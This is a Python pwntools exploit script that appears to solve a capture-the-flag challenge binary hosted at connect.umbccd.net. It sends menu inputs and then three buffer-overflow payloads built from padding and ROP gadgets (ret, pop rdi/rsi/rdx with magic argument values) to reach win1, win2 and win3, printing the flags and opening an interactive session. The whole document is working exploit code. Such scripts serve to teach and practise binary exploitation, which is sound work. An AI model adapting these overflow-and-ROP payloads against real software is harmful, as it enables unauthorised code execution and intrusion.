from pwn import * 

gs = '''
b *win1+199
b *win2+236
continue
'''

elf = context.binary = ELF("./64bits_in_my_ark_and_texture")

def start():
    if args.REMOTE:
        return remote("connect.umbccd.net", 22237)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

io.sendlineafter("> ", b"2")
io.sendlineafter("> ", b"1")
io.sendlineafter("> ", b"4")

io.recv()

io.sendline(b"A"*152 + p64(ret) + p64(elf.sym.win1))

io.recvline()

print("Primera flag:", io.recvline())

io.sendline(b"A"*40 + p64(pop_rdi) + p64(0xdeadbeef) + p64(ret) +p64(elf.sym.win2))

io.recvline()

io.recvline()

print("Segunda flag:", io.recvline())

io.sendline(b"A"*56 + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xdeafface) + p64(pop_rdx) + p64(0xfeedcafe) + p64(ret) + p64(elf.sym.win3))

io.interactive()